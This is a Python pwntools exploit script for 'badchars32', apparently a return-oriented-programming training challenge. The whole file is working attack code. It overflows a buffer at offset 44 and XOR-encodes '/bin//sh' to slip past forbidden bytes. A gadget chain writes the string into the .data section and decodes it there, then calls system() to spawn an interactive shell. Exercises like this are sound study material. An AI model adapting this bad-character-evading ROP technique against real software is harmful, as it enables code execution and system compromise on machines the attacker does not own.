#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44						# EIP Offset at 44
    sh_string = "/bin//sh"
    encoded_sh_string = ""
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]	# Badchars: b i c / <space> f n s
    xored_value = [0x0]*8					# XOR value array
    pos = 0
    data_addr = 0x0804a038 + 5					# .data section address +5 to write /bin//sh string

    # Encode the /bin//sh string using XOR to avoid badchars
    for i in sh_string:
        encoded = ord(i) ^ xored_value[pos]
        while encoded in badchars:
		xored_value[pos] += 1
		encoded = ord(i) ^ xored_value[pos]
	encoded_sh_string += chr(encoded)
	pos += 1

    # ROPChain to write the encoded_sh_string into .data section
    rop = p32(0x08048899)		# pop esi ; pop edi ; ret
    rop += encoded_sh_string[:4]	# Write encoded "/bin"
    rop += p32(data_addr)		# Data section address
    rop += p32(0x08048893)		# mov dword ptr [edi], esi ; ret

    rop += p32(0x08048899)           	# pop esi ; pop edi ; ret
    rop += encoded_sh_string[4:]        # Write encoded "//sh"
    rop += p32(data_addr+4)             # Data section address
    rop += p32(0x08048893)              # mov dword ptr [edi], esi ; ret

    # ROPChain to decode the encoded_sh_string
    temp = data_addr
    for i in range (0,8):
	rop += p32(0x08048896)			# pop ebx ; pop ecx ; ret
	rop += p32(temp)			# Data section address
	rop += p32(xored_value[i])		# the xored_value
	rop += p32(0x08048890)  		# xor byte ptr [ebx], cl ; ret
	temp += 1				# Move 1 byte

    system_plt = p32(0x80484e0)
    p = process("./badchars32")
    payload = junk + rop + system_plt + "BBBB" + p32(data_addr)

    p.sendlineafter("s\n> ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
